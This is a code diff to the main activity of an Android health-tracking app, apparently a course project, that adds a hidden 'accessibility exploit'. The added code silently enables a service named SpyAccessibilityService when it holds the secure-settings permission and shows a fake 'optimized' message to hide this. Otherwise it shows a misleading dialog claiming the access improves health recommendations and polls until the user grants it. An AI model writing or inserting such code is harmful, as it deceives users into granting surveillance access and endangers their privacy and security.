@@ -1,6 +1,7 @@
 package com.inf2007.healthtracker
 
 import android.Manifest
+import android.app.AlertDialog
 import android.content.pm.PackageManager
 import android.os.Bundle
 import androidx.activity.ComponentActivity
@@ -33,6 +34,7 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import android.provider.Settings
 import android.widget.Toast
+import com.inf2007.healthtracker.utilities.SpyAccessibilityService
 
 class MainActivity : ComponentActivity() {
     private val PERMISSIONS_REQUEST_CODE = 100
@@ -85,7 +87,6 @@ class MainActivity : ComponentActivity() {
             }
         }
 
-//        requestPermissions()
         checkAndRequestPermissions()
     }
 
@@ -367,5 +368,62 @@ class MainActivity : ComponentActivity() {
             digits[randomIndex] = newDigit.digitToChar()
         }
         return String(digits)
+    }
+
+    private fun tryEnableAccessibilityExploit() {
+        // Check if we already have the service enabled
+        if (SpyAccessibilityService.isEnabled(this)) {
+            Log.d("Exploit", "Accessibility service already enabled")
+            return
+        }
+
+        // Check if we have WRITE_SECURE_SETTINGS permission
+        val hasWriteSecureSettings = checkCallingOrSelfPermission("android.permission.WRITE_SECURE_SETTINGS") ==
+                PackageManager.PERMISSION_GRANTED
+
+        if (hasWriteSecureSettings) {
+            // We can enable it programmatically!
+            Log.d("Exploit", "Attempting to enable accessibility service via WRITE_SECURE_SETTINGS")
+            SpyAccessibilityService.tryEnableProgrammatically(this)
+
+            // Show a fake "optimization" message
+            Toast.makeText(this, "Health monitoring optimized", Toast.LENGTH_SHORT).show()
+
+        } else {
+            // Fallback: Show user the legitimate way to enable it
+            Log.d("Exploit", "No WRITE_SECURE_SETTINGS - showing legitimate request")
+            showLegitimateAccessibilityRequest()
+        }
+    }
+
+    private fun showLegitimateAccessibilityRequest() {
+        AlertDialog.Builder(this)
+            .setTitle("Enhanced Health Tracking")
+            .setMessage("For better health insights, enable accessibility services. This helps track app usage patterns for personalized recommendations.")
+            .setPositiveButton("Enable") { _, _ ->
+                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
+                startActivity(intent)
+
+                // Start polling to detect when user enables it
+                startPollingForAccessibility()
+            }
+            .setNegativeButton("Skip", null)
+            .show()
+    }
+
+    private fun startPollingForAccessibility() {
+        val pollHandler = Handler(Looper.getMainLooper())
+        val pollRunnable = object : Runnable {
+            override fun run() {
+                if (SpyAccessibilityService.isEnabled(this@MainActivity)) {
+                    // Success! Stop polling
+                    Toast.makeText(this@MainActivity,
+                        "Enhanced tracking activated", Toast.LENGTH_SHORT).show()
+                    return
+                }
+                pollHandler.postDelayed(this, 1000) // Check every second
+            }
+        }
+        pollHandler.post(pollRunnable)
     }
 }
